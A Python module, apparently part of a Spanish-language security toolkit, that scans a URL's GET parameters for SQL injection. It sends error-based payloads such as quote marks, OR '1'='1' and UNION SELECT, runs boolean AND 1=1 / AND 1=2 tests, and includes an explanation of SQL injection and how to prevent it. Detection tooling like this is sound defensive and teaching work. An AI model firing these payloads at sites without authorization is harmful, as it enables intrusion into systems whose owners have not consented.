"""
sqli_detector.py — Herramienta 28: Detector de Inyección SQL
Realiza pruebas automatizadas de SQL Injection en parámetros de URLs
mediante técnicas Error-based y Boolean-based.
"""

import sys
import os
import urllib.parse
import time

# Asegura que el directorio raíz esté en el path al ejecutar directamente
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import (
    ok, error, warn, info, result,
    section_title, separator, dim, cyan, green, yellow, white, red, magenta,
    prompt, pause
)

try:
    import requests
    _HAS_REQ = True
except ImportError:
    _HAS_REQ = False


# Firmas comunes de errores de bases de datos
_DB_ERRORS = [
    "syntax error",
    "mysql_fetch",
    "ORA-",
    "PostgreSQL query failed",
    "SQL syntax",
    "SQLite/JDBCDriver",
    "System.Data.SQLClient",
    "Microsoft OLE DB Provider for SQL Server",
    "Unclosed quotation mark",
]

# Payloads básicos
_PAYLOADS = [
    "'", 
    '"', 
    "1' OR '1'='1", 
    "1\" OR \"1\"=\"1", 
    "1 ORDER BY 1--", 
    "1 UNION SELECT 1,2,3--"
]


def _test_error_based(url: str, params: dict, headers: dict) -> list:
    """Busca errores explícitos de base de datos en la respuesta."""
    findings = []
    
    for param_name in params.keys():
        for payload in _PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = test_params[param_name] + payload
            
            try:
                print(f"\r  {dim('Probando Error-based:')} {param_name}={test_params[param_name][:20]}..." + " "*20, end="")
                res = requests.get(url, params=test_params, headers=headers, timeout=5)
                
                # Buscar firmas de error
                for db_err in _DB_ERRORS:
                    if db_err.lower() in res.text.lower():
                        findings.append((param_name, payload, db_err))
                        break # No hace falta buscar más errores para este payload
                        
            except requests.RequestException:
                continue
                
    return findings


def _test_boolean_based(url: str, params: dict, headers: dict) -> list:
    """Compara respuestas True/False para detectar inyecciones ciegas."""
    findings = []
    
    # Primero obtenemos la respuesta "Base" limpia
    try:
        base_res = requests.get(url, params=params, headers=headers, timeout=5)
        base_length = len(base_res.text)
    except requests.RequestException:
        return findings

    for param_name in params.keys():
        # Payload que siempre es TRUE
        true_payload = " AND 1=1"
        # Payload que siempre es FALSE
        false_payload = " AND 1=2"
        
        test_params_true = params.copy()
        test_params_false = params.copy()
        
        test_params_true[param_name] = test_params_true[param_name] + true_payload
        test_params_false[param_name] = test_params_false[param_name] + false_payload
        
        try:
            print(f"\r  {dim('Probando Boolean-based:')} {param_name}" + " "*40, end="")
            res_true = requests.get(url, params=test_params_true, headers=headers, timeout=5)
            res_false = requests.get(url, params=test_params_false, headers=headers, timeout=5)
            
            # Si la longitud TRUE es similar a la BASE, pero la FALSE es muy distinta, hay SQLi
            len_true = len(res_true.text)
            len_false = len(res_false.text)
            
            # Tolerancia de diferencia (a veces la web cambia de tamaño por un banner dinámico)
            diff_true = abs(base_length - len_true)
            diff_false = abs(base_length - len_false)
            
            if diff_true < 500 and diff_false > 500: # Diferencia notable
                findings.append((param_name, "Boolean Blind", f"Base:{base_length} | T:{len_true} | F:{len_false}"))
                
        except requests.RequestException:
            continue
            
    return findings


def _scan_sqli(target_url: str) -> None:
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    parsed_url = urllib.parse.urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    
    # Extraer parámetros de la URL ingresada
    query_params = urllib.parse.parse_qs(parsed_url.query)
    # parse_qs devuelve listas, las aplanamos a strings para requests
    params = {k: v[0] for k, v in query_params.items()}

    if not params:
        error("La URL no contiene parámetros GET (ej: ?id=1).")
        warn("SQL Injection generalmente se prueba sobre parámetros variables.")
        return

    info(f"Escaneando objetivo: {cyan(base_url)}")
    info(f"Parámetros detectados: {white(str(list(params.keys())))}")
    separator("─", 60)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyberToolkit SQLi/1.0"
    }

    findings = []
    
    # 1. Error-based
    err_findings = _test_error_based(base_url, params, headers)
    if err_findings:
        findings.extend(err_findings)
        
    # 2. Boolean-based (si no se encontraron errores evidentes)
    if not err_findings:
        bool_findings = _test_boolean_based(base_url, params, headers)
        if bool_findings:
            findings.extend(bool_findings)
            
    # Limpiar consola
    print("\r" + " "*70 + "\r", end="")

    print()
    separator("═", 75)
    print(f"  {white('RESULTADOS DEL ESCÁNER SQLi')}")
    separator("─", 75)

    if findings:
        for param, payload, detail in findings:
            print(f"  {red('⚠ VULNERABLE:')} Parámetro {yellow(param)}")
            print(f"  {white('Payload Usado:')} {cyan(payload)}")
            print(f"  {white('Detalle/Firma:')} {detail}")
            print(f"  {dim('-'*60)}")
        print()
        warn("¡Existen parámetros inyectables! Es posible extraer la base de datos.")
        warn("Utilizá herramientas avanzadas como 'sqlmap' para confirmar y explotar.")
    else:
        print(f"  {green('✓')} No se detectaron vulnerabilidades de SQL Injection evidentes.")
        
    print()


def _mode_run() -> None:
    section_title("DETECTOR DE INYECCIÓN SQL")
    
    if not _HAS_REQ:
        error("Faltan librerías. Ejecutá: pip install requests")
        return

    warn("ATENCIÓN: Realiza pruebas intrusivas. Úsalo SOLO con autorización.")
    target = prompt("URL a escanear (Ej. http://site.com/view.php?id=1)").strip()
    
    if target:
        _scan_sqli(target)


def _mode_explain() -> None:
    section_title("¿QUÉ ES SQL INJECTION?")

    print(f"""
  {white('1. El problema (Input no validado)')}
  {dim('─' * 56)}
  Cuando una página web recibe un ID por la URL (ej. ?id=1) y lo 
  concatena directamente en la base de datos:
  {magenta('SELECT * FROM users WHERE id = ' + $_GET['id'])}

  {white('2. Error-Based SQLi')}
  {dim('─' * 56)}
  Si enviamos una comilla simple (?id=1'), la consulta se rompe:
  {magenta("SELECT * FROM users WHERE id = 1'")} -> Error de Sintaxis.
  Si la web muestra ese error, sabemos que es inyectable.

  {white('3. Boolean-Based Blind SQLi')}
  {dim('─' * 56)}
  A veces los programadores ocultan los errores. Para saber si es 
  vulnerable, hacemos preguntas de VERDADERO / FALSO:
  {cyan('?id=1 AND 1=1')} -> Devuelve la página normal.
  {cyan('?id=1 AND 1=2')} -> Devuelve una página vacía o "No encontrado".
  Esa diferencia de comportamiento nos confirma la inyección "a ciegas".

  {white('4. Prevención')}
  {dim('─' * 56)}
  Usar {green('Prepared Statements')} (Consultas Parametrizadas). Nunca, bajo
  ninguna circunstancia, concatenar variables directamente en código SQL.
    """)


# ──────────────────────────────────────────────
#  Submenú
# ──────────────────────────────────────────────
_SUBMENU = [
    ("1", "Escanear URL (SQLi)",                  _mode_run),
    ("2", "¿Qué es SQL Injection?",               _mode_explain),
]

def _print_submenu() -> None:
    print()
    info("¿Qué querés hacer?")
    separator("─", 58)
    for key, label, _ in _SUBMENU:
        print(f"  {cyan(f'[{key}]')} {white(label)}")
    print(f"  {red('[0]')} {dim('Volver al menú principal')}")
    separator("─", 58)


# ──────────────────────────────────────────────
#  Punto de entrada
# ──────────────────────────────────────────────
def run() -> None:
    while True:
        section_title("HERRAMIENTA 28 — SQLi DETECTOR")
        _print_submenu()

        choice = prompt("Opción", default="0")

        if choice == "0":
            break

        matched = False
        for key, _, func in _SUBMENU:
            if choice == key:
                matched = True
                try:
                    func()
                except KeyboardInterrupt:
                    print()
                    warn("Operación cancelada.")
                break

        if not matched:
            error("Opción no válida. Ingresá un número del 0 al 2.")

        pause()


if __name__ == "__main__":
    run()
